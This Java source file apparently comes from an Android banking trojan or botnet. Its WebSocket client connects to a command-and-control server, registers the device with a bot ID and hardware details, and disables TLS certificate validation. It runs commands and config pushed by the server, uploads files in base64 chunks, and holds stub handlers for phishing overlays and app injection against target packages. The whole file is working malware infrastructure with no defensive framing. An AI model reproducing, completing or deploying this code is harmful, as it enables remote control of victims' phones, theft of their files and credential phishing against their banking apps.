package com.xrc.system.network;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.CryptoManager;

import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.net.URISyntaxException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class XRCWebSocketClient {
    private static final String TAG = Constants.TAG + ":WS";
    private static XRCWebSocketClient instance;
    private final Context ctx;
    private final Handler handler;
    private final CryptoManager crypto;
    private final ScheduledExecutorService heartbeatExecutor;
    private org.java_websocket.client.WebSocketClient client;
    private boolean connected = false;
    private boolean shouldReconnect = true;
    private String currentUrl = "";
    private Runnable reconnectRunnable;

    private XRCWebSocketClient(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
        this.crypto = new CryptoManager();
        this.heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
    }

    public static synchronized XRCWebSocketClient get(Context ctx) {
        if (instance == null) {
            instance = new XRCWebSocketClient(ctx);
        }
        return instance;
    }

    public void connect() {
        String url = ConfigManager.get(ctx).getC2Server();
        if (url.equals(currentUrl) && connected) return;
        shouldReconnect = true;
        currentUrl = url;
        disconnect();
        try {
            URI uri = new URI(url);
            client = new org.java_websocket.client.WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    connected = true;
                    Log.i(TAG, "Connected to " + url);
                    sendAuth();
                    startHeartbeat();
                }

                @Override
                public void onMessage(String message) {
                    handleMessage(message);
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    connected = false;
                    Log.w(TAG, "Closed: " + code + " " + reason);
                    if (shouldReconnect) scheduleReconnect();
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "WS Error", ex);
                }
            };
            if (url.startsWith("wss://")) {
                try {
                    javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance("TLS");
                    sslContext.init(null, new javax.net.ssl.TrustManager[]{new javax.net.ssl.X509TrustManager() {
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                    }}, new java.security.SecureRandom());
                    client.setSocketFactory(sslContext.getSocketFactory());
                } catch (Exception e) {
                    Log.e(TAG, "SSL setup failed", e);
                }
            }
            client.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "Invalid URI", e);
        }
    }

    public void disconnect() {
        shouldReconnect = false;
        if (reconnectRunnable != null) {
            handler.removeCallbacks(reconnectRunnable);
            reconnectRunnable = null;
        }
        if (client != null) {
            try {
                client.close();
            } catch (Exception ignored) {}
        }
        connected = false;
    }

    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("bot_id", ConfigManager.get(ctx).getBotId());
            auth.put("device", android.os.Build.MODEL);
            auth.put("manufacturer", android.os.Build.MANUFACTURER);
            auth.put("android_version", android.os.Build.VERSION.RELEASE);
            auth.put("sdk", android.os.Build.VERSION.SDK_INT);
            auth.put("rsa_pub", crypto.getRSAPublicKey());
            send(auth.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Auth failed", e);
        }
    }

    private void startHeartbeat() {
        heartbeatExecutor.scheduleAtFixedRate(() -> {
            try {
                if (connected) {
                    JSONObject ping = new JSONObject();
                    ping.put("type", "ping");
                    ping.put("ts", System.currentTimeMillis());
                    send(ping.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat failed", e);
            }
        }, Constants.WS_HEARTBEAT_INTERVAL, Constants.WS_HEARTBEAT_INTERVAL, TimeUnit.MILLISECONDS);
    }

    private void scheduleReconnect() {
        if (reconnectRunnable != null) {
            handler.removeCallbacks(reconnectRunnable);
        }
        reconnectRunnable = () -> {
            reconnectRunnable = null;
            if (shouldReconnect && !connected) {
                Log.i(TAG, "Reconnecting...");
                connect();
            }
        };
        handler.postDelayed(reconnectRunnable, Constants.WS_RECONNECT_DELAY);
    }

    public void send(String message) {
        if (client != null && connected && message != null) {
            client.send(message);
        }
    }

    public void sendEvent(String eventType, JSONObject data) {
        try {
            JSONObject evt = new JSONObject();
            evt.put("type", "event");
            evt.put("event", eventType);
            evt.put("data", data);
            evt.put("ts", System.currentTimeMillis());
            send(evt.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Event send failed", e);
        }
    }

    public void sendFileChunk(String filename, byte[] chunk, int index, int total) {
        try {
            JSONObject file = new JSONObject();
            file.put("type", "file_chunk");
            file.put("filename", filename);
            file.put("chunk", android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP));
            file.put("index", index);
            file.put("total", total);
            send(file.toString());
        } catch (JSONException e) {
            Log.e(TAG, "File chunk failed", e);
        }
    }

    private void handleMessage(String raw) {
        try {
            JSONObject msg = new JSONObject(raw);
            String type = msg.optString("type", "");
            switch (type) {
                case "cmd":
                    CommandHandler.get(ctx).execute(msg);
                    break;
                case "config":
                    ConfigManager.get(ctx).applyRemoteConfig(msg.optJSONObject("data"));
                    break;
                case "phishlet":
                    handlePhishlet(msg);
                    break;
                case "inject":
                    handleInject(msg);
                    break;
                case "pong":
                    break;
                default:
                    Log.d(TAG, "Unknown message type: " + type);
                    break;
            }
        } catch (JSONException e) {
            Log.e(TAG, "Message parse failed", e);
        }
    }

    private void handlePhishlet(JSONObject msg) {
        String action = msg.optString("action", "");
        if (action.equals("show")) {
            String pkg = msg.optString("target", "");
            String html = msg.optString("html", "");
            // Trigger phishing overlay
        }
    }

    private void handleInject(JSONObject msg) {
        String action = msg.optString("action", "");
        if (action.equals("enable")) {
            JSONArray targets = msg.optJSONArray("targets");
            if (targets != null) {
                for (int i = 0; i < targets.length(); i++) {
                    String pkg = targets.optString(i, "");
                    // Enable injection for pkg
                }
            }
        }
    }

    public boolean isConnected() {
        return connected;
    }
}
